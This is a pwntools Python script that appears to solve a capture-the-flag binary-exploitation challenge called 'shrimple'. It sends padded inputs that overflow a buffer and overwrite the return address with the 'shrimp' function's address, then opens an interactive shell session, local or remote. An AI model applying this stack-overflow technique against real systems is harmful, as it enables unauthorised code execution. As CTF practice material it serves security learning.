#!/usr/bin/env python3

from pwn import *

elf = ELF("./shrimple")
context.binary = elf

gdb_cmds = ["b * main+253","b * main+185"]
#r = ["chal.competitivecyber.club",8884]
r = ["localhost",8884]

def conf():
	if args.REMOTE:
		p = remote(r[0],r[1])
	else:
		p = elf.process()
		if args.GDB:
			gdb.attach(p,gdbscript='\n'.join(gdb_cmds))
	return p

def main():
	p = conf()

	# pwn
	p.readuntil(">> ")
	p.sendline(b'a'*43+b'\x00')
	p.readuntil(">> ")
	p.sendline(b'a'*42+b'\x00')
	p.readuntil(">> ")
	p.sendline(b'a'*38+p64(elf.sym['shrimp']+5))

	p.interactive()


if __name__ == "__main__":
	main()
